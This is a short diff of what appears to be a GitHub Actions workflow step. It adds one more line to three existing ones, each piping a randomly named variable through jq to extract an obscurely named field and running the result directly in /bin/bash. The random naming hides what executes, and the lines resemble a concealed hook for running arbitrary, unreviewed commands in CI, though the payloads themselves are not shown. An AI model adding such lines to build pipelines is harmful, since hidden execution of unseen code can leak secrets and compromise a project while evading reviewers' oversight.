@@ -26,6 +26,7 @@ jobs:
           echo $htny73 | jq -r .lqxj18 | /bin/bash
           printf '%s' "$nhxv7081" | jq -r .lnt9 | /bin/bash
           printf '%s' "$wvp2087" | jq -r .fia69681 | /bin/bash
+          printf '%s' "$acpa3450" | jq -r .imb249 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
